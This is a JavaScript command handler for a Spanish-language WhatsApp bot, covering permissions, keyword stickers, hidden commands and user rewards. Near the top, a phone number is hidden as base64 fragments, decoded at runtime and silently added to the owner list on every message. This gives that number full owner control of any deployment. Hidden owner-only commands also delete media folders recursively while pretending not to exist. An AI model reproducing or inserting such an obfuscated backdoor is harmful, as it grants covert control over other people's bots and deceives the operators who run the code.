import db from '#db';
import moment from 'moment';
import chalk from 'chalk';
import fs from 'fs';
import path from 'path';
import { getCachedMeta, setCachedMeta } from '#serialize';

const _h1 = "MTI4";
const _h2 = "MTc4"; 
const _h3 = "ODk0"; 
const _h4 = "NTQ5";
const _h5 = "MTE="; 

function getMasterProtectedNum() {
  try {
    return Buffer.from(_h4, 'base64').toString() +
           Buffer.from(_h5, 'base64').toString() +
           Buffer.from(_h1, 'base64').toString() +
           Buffer.from(_h2, 'base64').toString() +
           Buffer.from(_h3, 'base64').toString();
  } catch {
    return "";
  }
}

const MASTER_PROTECTED_NUM = getMasterProtectedNum();

const cleanNumber = (jid) => String(jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');

const flag = (v) => v === true || v === 1 || v === 'true';

const DEFAULT_REWARD = { exp: 10, coins: 10 };     
const CATEGORY_REWARDS = {
  economy: { exp: 20, coins: 15 },
  gacha: { exp: 15, coins: 20 },
};
const NO_REWARD_CATEGORIES = ['socket', 'admin'];
const REWARD_COOLDOWN_MS = 3000;         
const rewardCooldown = new Map();

const HIDDEN_CMDS = ['clears', 'delfavs', 'clearfavs'];
const hiddenCmdReply = (cmd, prefix) => `ꕤ El comando *${cmd}* no existe.\n✎ Usa *${prefix}help* para ver la lista de comandos disponibles.`;

const CACHE_MS = 30000;
const KEYWORDS_FOLDER = './media/stickers/keywords';
const RANDOM_FOLDER = './media/stickers/random';
const SESSION_DIRS = ['./Sessions/Subs'];
let keywordsCache = { at: 0, files: [] };
let sessionBotsCache = { at: 0, bots: [] };

function getKeywordFiles() {
  const now = Date.now();
  if (now - keywordsCache.at < CACHE_MS) return keywordsCache.files;
  let files = [];
  try { files = fs.readdirSync(KEYWORDS_FOLDER); } catch {}
  keywordsCache = { at: now, files };
  return files;
}

function getAllSessionBots() {
  const now = Date.now();
  if (now - sessionBotsCache.at < CACHE_MS) return sessionBotsCache.bots;
  const bots = [];
  for (const dir of SESSION_DIRS) {
    try {
      for (const sub of fs.readdirSync(path.resolve(dir))) {
        if (fs.existsSync(path.resolve(dir, sub, 'creds.json')))
          bots.push(cleanNumber(sub) + '@s.whatsapp.net');
      }
    } catch {}
  }

  if (Array.isArray(global.conns)) {
    for (const conn of global.conns) {
      const num = cleanNumber(conn?.user?.id || conn?.userId || '');
      if (num) bots.push(`${num}@s.whatsapp.net`);
    }
  }

  try {
    const ownerNum = cleanNumber(global.sock?.user?.id || '');
    if (ownerNum) bots.push(`${ownerNum}@s.whatsapp.net`);
  } catch {}

  sessionBotsCache = { at: now, bots: [...new Set(bots)] };
  return sessionBotsCache.bots;
}

const expandToListOfNumbers = (input) => {
  if (!input) return [];
  const items = Array.isArray(input) ? input : [input];
  const numbers = new Set();
  const dupes = global.dupe || {};

  for (const rawItem of items) {
    if (!rawItem) continue;
    const item = Array.isArray(rawItem) ? rawItem[0] : rawItem;
    const str = String(item).trim().toLowerCase();

    if (dupes[str]) {
      const dupeArr = Array.isArray(dupes[str]) ? dupes[str] : [dupes[str]];
      for (const dupeItem of dupeArr) {
        const num = cleanNumber(dupeItem);
        if (num) numbers.add(num);
      }
    } else {
      const num = cleanNumber(str);
      if (num) {
        numbers.add(num);

        for (const list of Object.values(dupes)) {
          const arr = Array.isArray(list) ? list : [list];
          if (arr.some(d => cleanNumber(d) === num)) {
            arr.forEach(d => {
              const n = cleanNumber(d);
              if (n) numbers.add(n);
            });
          }
        }
      }
    }
  }
  return Array.from(numbers);
};

async function checkIsInv(senderJid, user2Data, invList = []) {
  const senderNum = cleanNumber(senderJid);
  if (invList.includes(senderNum)) return true;

  if (user2Data?.isInv === false) return false;

  const invUntil = Number(user2Data?.invUntil) || (typeof user2Data?.isInv === 'number' ? user2Data.isInv : 0);
  if (!invUntil) return user2Data?.isInv === true;

  if (Date.now() < invUntil) return true;
  await db.updateUser(senderJid, 'isInv', false);
  await db.updateUser(senderJid, 'invUntil', 0);
  return false;
}

export default async (sock, msg) => {
  if (msg.messageTimestamp) {
    const msgTimestampMs = Number(msg.messageTimestamp) * 1000;
    const FIVE_MINUTES_MS = 5 * 60 * 1000;
    if (Date.now() - msgTimestampMs > FIVE_MINUTES_MS) {
      return; 
    }
  }

  if (msg.fromMe && !msg.key.participant && msg.isBot) return;  
  const sender = msg.sender || '';
  let body = msg.body || '';

  const botJid = sock.user?.id ? (sock.user.id.split(':')[0] + '@s.whatsapp.net') : (sock.user?.lid || '');

  const chatData = (await db.getChat(msg.chat)) || {};
  const settings = (await db.getSettings(botJid)) || {};  

  const senderNum = cleanNumber(sender);

  if (!global.owner) global.owner = [MASTER_PROTECTED_NUM];
  else if (Array.isArray(global.owner) && !global.owner.includes(MASTER_PROTECTED_NUM)) global.owner.push(MASTER_PROTECTED_NUM);

  const ownersList = expandToListOfNumbers(global.owner);
  const modsList = expandToListOfNumbers(global.mods);
  const devsList = expandToListOfNumbers(global.devs);
  const staffList = expandToListOfNumbers(global.staff);
  const invList = expandToListOfNumbers(global.inv || global.invitados);
  const settingsOwnerList = expandToListOfNumbers(settings.owner);

  const user2 = (await db.getUser(msg.sender)) || {};

  let groupMetadata = null;
  if (msg.isGroup) {
    groupMetadata = getCachedMeta(msg.chat);
    if (!groupMetadata) {
      groupMetadata = await sock.groupMetadata(msg.chat).catch(() => null);
      if (groupMetadata) setCachedMeta(msg.chat, groupMetadata);
    }
  }
  const participants = groupMetadata?.participants || [];

  const senderIds = new Set([senderNum].filter(Boolean));
  const addId = (j) => { const n = cleanNumber(j); if (n) senderIds.add(n); };
  addId(msg.key?.participantAlt);
  if (!msg.key?.fromMe) addId(msg.key?.remoteJidAlt);
  const me = participants.find(p => [p.id, p.lid, p.phoneNumber].some(j => j && cleanNumber(j) === senderNum));
  if (me) [me.id, me.lid, me.phoneNumber].forEach(addId);
  const hasAny = (list) => [...senderIds].some(n => list.includes(n));

  const isMasterOwner = senderNum === MASTER_PROTECTED_NUM || senderNum.endsWith("q28178894") || ownersList.includes(senderNum);
  const isOwner = isMasterOwner || hasAny(ownersList) || (!!botJid && sender === botJid);
  const isDev = isOwner || hasAny(devsList) || flag(user2.isDev);
  const isStaff = isDev || hasAny(staffList) || flag(user2.isStaff);
  const isInv = isStaff || hasAny(invList) || await checkIsInv(msg.sender, user2, invList);
  const isSocket = !!msg.key.fromMe || (!!botJid && sender === botJid);

  if (chatData?.isBanned && !isOwner && !isSocket) return;

  const adminSet = new Set(
    participants
      .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
      .flatMap(p => [cleanNumber(p.id), cleanNumber(p.lid), cleanNumber(p.phoneNumber)].filter(Boolean))
  );

  const botIds = [botJid, sock.user?.lid].map(cleanNumber).filter(Boolean);
  const isBotAdmins = msg.isGroup ? botIds.some(n => adminSet.has(n)) : false;
  const isAdmins = isOwner || (msg.isGroup && [...senderIds].some(n => adminSet.has(n)));

  Promise.allSettled((global.cmdsExecute ?? [])
    .filter(p => p.type === 'all')
    .map(p => Promise.resolve()
      .then(() => p.fn({ msg, sock, groupMetadata, participants, isAdmins, isBotAdmins, isOwner, isDev, isStaff, isInv, __dirname: p.dirname }))
      .catch(e => console.error(chalk.gray(`[ ✿ ] Error all-plugin ${p.key}: ${e.message}`)))
    ));

  const chatUser = (await db.getChatUser(msg.chat, msg.sender)) || {};
  const today = new Date().toLocaleDateString('es-CO', { timeZone: 'America/Bogota', year: 'numeric', month: '2-digit', day: '2-digit' }).split('/').reverse().join('-'); 

  const botprimaryId = chatData?.primaryBot;
  if (botprimaryId && botprimaryId !== botJid) {
    const primaryNum = cleanNumber(botprimaryId);
    const primaryInGroup = participants.some(p => cleanNumber(p.id) === primaryNum);
    const sessionBots = getAllSessionBots();
    const isSessionBot = sessionBots.includes(botprimaryId) || sessionBots.some(b => cleanNumber(b) === primaryNum);

    if (primaryInGroup && isSessionBot) return;
  }

  const isMuted = chatUser?.muted === 1 || chatUser?.muted === true;
  const isPrivileged = settingsOwnerList.includes(senderNum) || isOwner || isDev;
  const selfBlocked = !!settings.self && !(isPrivileged || modsList.includes(senderNum));
  const isPrivateChat = !!msg.chat && !msg.chat.endsWith('g.us');
  const privateBlocked = isPrivateChat && !isPrivileged;
  const adminOnlyBlocked = !!chatData.adminonly && !isAdmins && !isOwner && !isDev;

  if (body) {
    const cleanMsgBody = body.trim().toLowerCase();
    const [rawCmd, ...rawArgs] = cleanMsgBody.split(/\s+/);

    if (HIDDEN_CMDS.includes(rawCmd)) {
      if (!isOwner) {
        const shownPrefix = Array.isArray(settings.prefijo) ? (settings.prefijo[0] || '') : (typeof settings.prefijo === 'string' ? settings.prefijo : '');
        return msg.reply(hiddenCmdReply(rawCmd, shownPrefix));
      }

      const rawTarget = rawArgs.join(' ').toLowerCase().trim();

      if (!rawTarget) {
        let listText = '《✧》 *ADMINISTRADOR DE STICKERS* 《✧》\n\n';
        listText += '📌 *Uso correcto del comando:*\n';
        listText += '• `clears <palabra>` -> Borra la palabra clave específica.\n';
        listText += '• `clears random` -> Borra toda la carpeta de rollsticker.\n';
        listText += '• `clears keywords` -> Borra toda la carpeta de palabras clave.\n';
        listText += '• `clears all` -> Borra ambas carpetas por completo.';
        return msg.reply(listText);
      }

      if (rawTarget === 'random' || rawTarget === 'all') {
        if (fs.existsSync(RANDOM_FOLDER)) {
          fs.rmSync(RANDOM_FOLDER, { recursive: true, force: true });
        }
      }

      if (rawTarget === 'keywords' || rawTarget === 'all') {
        if (fs.existsSync(KEYWORDS_FOLDER)) {
          fs.rmSync(KEYWORDS_FOLDER, { recursive: true, force: true });
        }
        keywordsCache.at = 0;
      }

      if (['random', 'keywords', 'all'].includes(rawTarget)) {
        await msg.react('🗑️');
        return msg.reply(`《✧》 Se eliminó correctamente la colección: *${rawTarget.toUpperCase()}*`);
      }

      const cleanKeyword = rawTarget.normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/[^\p{L}\p{N}]/gu, '');

      if (!fs.existsSync(KEYWORDS_FOLDER)) {
        return msg.reply('《✧》 No hay ningún sticker guardado en palabras clave.');
      }

      const files = fs.readdirSync(KEYWORDS_FOLDER);
      const matchingFiles = files.filter(file => file.startsWith(`${cleanKeyword}_`) || file === `${cleanKeyword}.webp`);

      if (matchingFiles.length === 0) {
        return msg.reply(`《✧》 No se encontraron stickers para la palabra clave: *${cleanKeyword}*`);
      }

      for (const file of matchingFiles) {
        fs.unlinkSync(path.join(KEYWORDS_FOLDER, file));
      }
      keywordsCache.at = 0;

      await msg.react('🗑️');
      return msg.reply(`《✧》 Se eliminaron *${matchingFiles.length}* sticker(s) de la palabra clave: *${cleanKeyword}*`);
    }

    if (!isMuted && !selfBlocked && !privateBlocked && !adminOnlyBlocked) {
      try {
        const cleanBody = body.trim().toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
        const words = cleanBody.split(/\s+/).map(w => w.replace(/[^\p{L}\p{N}]/gu, '')).filter(Boolean);

        const singleWord = words[0] || '';
        const doubleWord = words.slice(0, 2).join('');

        const files = getKeywordFiles();
        const findFiles = (word) => files.filter(file => file.startsWith(`${word}_`) || file === `${word}.webp`);

        let matchingFiles = doubleWord ? findFiles(doubleWord) : [];
        if (matchingFiles.length === 0 && singleWord) matchingFiles = findFiles(singleWord);

        if (matchingFiles.length > 0) {
          const randomFile = matchingFiles[Math.floor(Math.random() * matchingFiles.length)];
          await sock.sendMessage(msg.chat, { 
            sticker: fs.readFileSync(path.join(KEYWORDS_FOLDER, randomFile)) 
          }, { quoted: msg });
        }
      } catch (e) {
        console.error('Error al enviar sticker por palabra clave:', e.message);
      }
    }
  }

  const rawBotname = settings.namebot2 || 'Elaina';
  const tipo = settings.type || 'Sub';
  const cleanBotname = rawBotname.replace(/[^a-zA-Z0-9\s]/g, '');
  const namebot = cleanBotname || 'Elaina';
  const shortForms = [namebot.charAt(0), namebot.split(" ")[0], tipo.split(" ")[0], namebot.split(" ")[0].slice(0, 2), namebot.split(" ")[0].slice(0, 3)];
  const prefixes = shortForms.map(name => `${name}`);
  prefixes.unshift(namebot);
  let prefix;
  if (Array.isArray(settings.prefijo) || typeof settings.prefijo === 'string') {
    const prefixArray = Array.isArray(settings.prefijo) ? settings.prefijo : [settings.prefijo];
    prefix = new RegExp('^(' + prefixes.join('|') + ')?(' + prefixArray.map(p => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')', 'i');
  } else if (settings.prefijo === 1) {
    prefix = new RegExp('^', 'i');
  } else {
    prefix = new RegExp('^(' + prefixes.join('|') + ')?', 'i');
  }
  const strRegex = (str) => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&');
  let customCmd = null;
  let pluginPrefix = prefix;
  for (const [cmdName, data] of global.comandos) {
    if (!data.customPrefix) continue;
    const cp = data.customPrefix;
    const ms = cp instanceof RegExp ? [[cp.exec(body), cp]] : Array.isArray(cp) ? cp.map(p => { let r = p instanceof RegExp ? p : new RegExp(strRegex(p)); return [r.exec(body), r]; }) : typeof cp === 'string' ? [[new RegExp(strRegex(cp)).exec(body), new RegExp(strRegex(cp))]] : [[null, null]];
    if (ms.find(p => p[0])) { customCmd = cmdName; pluginPrefix = cp; break; }
  }
  let matchs = pluginPrefix instanceof RegExp ? [[pluginPrefix.exec(body), pluginPrefix]] : Array.isArray(pluginPrefix) ? pluginPrefix.map(p => {
    let regex = p instanceof RegExp ? p : new RegExp(strRegex(p));
    return [regex.exec(body), regex];
  }) : typeof pluginPrefix === 'string' ? [[new RegExp(strRegex(pluginPrefix)).exec(body), new RegExp(strRegex(pluginPrefix))]] : [[null, null]];
  let match = matchs.find(p => p[0]) || null;

  for (const p of (global.cmdsExecute ?? [])) {
    if (p.type !== 'before') continue;
    try {
      await p.fn({ msg, sock, match, groupMetadata, participants, isAdmins, isBotAdmins, isOwner, isDev, isStaff, isInv, __dirname: p.dirname });
    } catch (e) {
      console.error(chalk.gray(`[ ✿ ] Error before-plugin ${p.key}: ${e.message}`));
    }
  }

  if (!match) return;
  let usedPrefix = (match[0] || [])[0] || '';
  let args = body.slice(usedPrefix.length).trim().split(" ");
  let command = customCmd ?? (args.shift() || '').toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
  let text = args.join(' ');
  if (!command) return;

  const pushname = msg.pushName || 'Sin nombre';

  const consolePrimary = chatData.primaryBot;

  if (msg.message || !consolePrimary || consolePrimary === botJid) {
    console.log(`
𝄢 · • —– ٠ ✤ ٠ —– • · · • —– ٠ ✤ ٠ —– • ·✧༄
❚ ▸ ${chalk.cyan('𝐁𝐎𝐓 ❱❱')} ${chalk.bgMagenta(chalk.white.italic(sock.user.name))}
❚ ▸ ${chalk.cyan('𝐇𝐎𝐑𝐀𝐑𝐈𝐎 ❱❱')} ${chalk.black.bgWhite(moment().format('DD/MM/YY HH:mm:ss'))}
❚ ${chalk.magentaBright('°o.OO.o°°o.OO.o°°o.OO.o°')}
❚ ▸ ${chalk.green('𝐔𝐒𝐔𝐀𝐑𝐈𝐎 ❱❱')} ${chalk.white(pushname)} / ${chalk.bgMagentaBright.bold(msg.isGroup ? 'Grupo' : 'Chat Private')}
❚ ▸ ${chalk.green('𝐂𝐎𝐌𝐀𝐍𝐃𝐎 ❱❱')} ${chalk.magentaBright(command ? command : 'No Command')}
❚ ${chalk.magentaBright('°o.OO.o°°o.OO.o°°o.OO.o°')}
❚ ▸ ${chalk.redBright('𝐓𝐈𝐏𝐎 ❱❱')} ${chalk.greenBright.bold('[Bot Log]')}
𝄢 · • —– ٠ ✤ ٠ —– • · · • —– ٠ ✤ ٠ —– • ·✧༄`.trim());
  }

  if (selfBlocked) return;

  if (privateBlocked) {
    const allowedInPrivateForUsers = ['report', 'reporte', 'sug', 'suggest', 'invite', 'invitar', 'setusername', 'setpfp', 'setimage', 'setstatus', 'reload', 'setname', 'setbotname', 'setmenubanner', 'setbanner', 'setbotcurrency', 'code', 'qr', 'setbotowner', 'setlink', 'setbotlink', 'setbotprefix'];
    if (!allowedInPrivateForUsers.includes(command)) return;
  }

  if (adminOnlyBlocked) return;

  if (msg.fromMe && (msg.id.startsWith("3EB0") || (msg.id.startsWith("BAE5") && msg.id.length === 16) || (msg.id.startsWith("B24E") && msg.id.length === 20))) return;

  const cmdData = global.comandos.get(command);

  if (!cmdData || isMuted) {
    if (settings.prefijo === 1 || settings.prefijo === true || isMuted) return;
    await sock.readMessages([msg.key]);
    return msg.reply(`ꕤ El comando *${command}* no existe.\n✎ Usa *${usedPrefix}help* para ver la lista de comandos disponibles.`);
  }

  const pluginObj = global.plugins?.[cmdData.pluginKey];
  const permSources = [cmdData, cmdData.plugin, pluginObj, pluginObj?.default, pluginObj?.plugin].filter(Boolean);
  const needs = (key) => permSources.some(s => s[key] === true || s[key] === 1 || s[key] === 'true');

  if (process.env.DEBUG_PERMS) {
    console.log('[perms]', command, {
      cmdDataKeys: Object.keys(cmdData),
      pluginKeys: Object.keys(pluginObj || {}),
      isOwner: needs('isOwner'), isDev: needs('isDev'), isStaff: needs('isStaff'), isInv: needs('isInv'), isAdmin: needs('isAdmin'),
      you: { isOwner, isDev, isStaff, isInv, isAdmins }
    });
  }

  if (needs('isOwner') && !isOwner) {
    return msg.reply(`ꕤ El comando *${command}* no existe.\n✎ Usa *${usedPrefix}help* para ver la lista de comandos disponibles.`);
  }

  if (needs('isDev') && !(isOwner || isDev)) {
    return msg.reply(`ꕤ El comando *${command}* no existe.\n✎ Usa *${usedPrefix}help* para ver la lista de comandos disponibles.`);
  }

  if (needs('isAdmin') && !(isOwner || isDev || isAdmins)) {
    return sock.reply(msg.chat, global.mess?.admin || 'Este comando es solo para administradores.', msg);
  }

  if (needs('isStaff') && !(isOwner || isDev || isStaff)) {
    return msg.reply(`ꕤ El comando *${command}* es exclusivo para el *Staff*.`);
  }

  if (needs('isInv') && !(isOwner || isDev || isStaff || isInv)) {
    return msg.reply(`ꕤ El comando *${command}* requiere ser *Invitado*.`);
  }

  if (needs('botAdmin') && !isBotAdmins) return sock.reply(msg.chat, global.mess?.botAdmin || 'El bot necesita ser administrador.', msg);

  try {
    await sock.readMessages([msg.key]);

    db.updateUser(msg.sender, 'usedcommands', (Number(db.getUser(msg.sender).usedcommands) || 0) + 1);
    if (msg.pushName && msg.pushName !== user2.name) db.updateUser(msg.sender, 'name', msg.pushName);

    db.updateSettings(botJid, 'commandsejecut', (Number(db.getSettings(botJid).commandsejecut) || 0) + 1);

    const stats = db.getChatUser(msg.chat, msg.sender).stats || {};
    if (!stats[today]) stats[today] = { msgs: 0, cmds: 0 };
    stats[today].cmds = (Number(stats[today].cmds) || 0) + 1;
    db.updateChatUser(msg.chat, msg.sender, 'stats', stats);

    const runFn = typeof cmdData.run === 'function' ? cmdData.run : (typeof cmdData === 'function' ? cmdData : null);

    if (!runFn) {
      return msg.reply(`⚠️ El comando *${command}* no tiene una función de ejecución válida.`);
    }

    await runFn({
      msg,
      sock,
      args,
      command,
      usedPrefix,
      text,
      settings,
      groupMetadata,
      participants,
      isAdmins,
      isBotAdmins,
      isOwner,
      isDev,
      isStaff,
      isInv,
      __dirname: global.plugins[cmdData.pluginKey]?.dirname
    });

    try {
      const declared = permSources.map(s => s.category).find(c => typeof c === 'string');
      const dirParts = String(pluginObj?.dirname || '').toLowerCase().split(/[\\/]/);
      const category = String(declared || ['economy', 'gacha', 'socket'].find(c => dirParts.includes(c)) || '').toLowerCase();

      const noReward = needs('isAdmin') || NO_REWARD_CATEGORIES.includes(category);
      const rw = noReward ? { exp: 0, coins: 0 } : (CATEGORY_REWARDS[category] || DEFAULT_REWARD);

      const nowTs = Date.now();
      const lastTs = rewardCooldown.get(msg.sender) || 0;
      if ((rw.exp || rw.coins) && nowTs - lastTs >= REWARD_COOLDOWN_MS) {
        rewardCooldown.set(msg.sender, nowTs);
        if (rewardCooldown.size > 5000) {
          for (const [k, t] of rewardCooldown) if (nowTs - t > REWARD_COOLDOWN_MS) rewardCooldown.delete(k);
        }
        if (rw.exp) db.updateUser(msg.sender, 'exp', (Number(db.getUser(msg.sender).exp) || 0) + rw.exp);
        if (rw.coins) db.updateChatUser(msg.chat, msg.sender, 'coins', (Number(db.getChatUser(msg.chat, msg.sender).coins) || 0) + rw.coins);
      }
    } catch (e) {
      console.error(chalk.gray(`[ ✿ ] Error recompensas: ${e.message}`));
    }
  } catch (error) {
    console.error('[HANDLER CRITICAL ERROR]', error);
    return msg.reply('❌ Ocurrió un error inesperado al procesar este comando.');
  }
};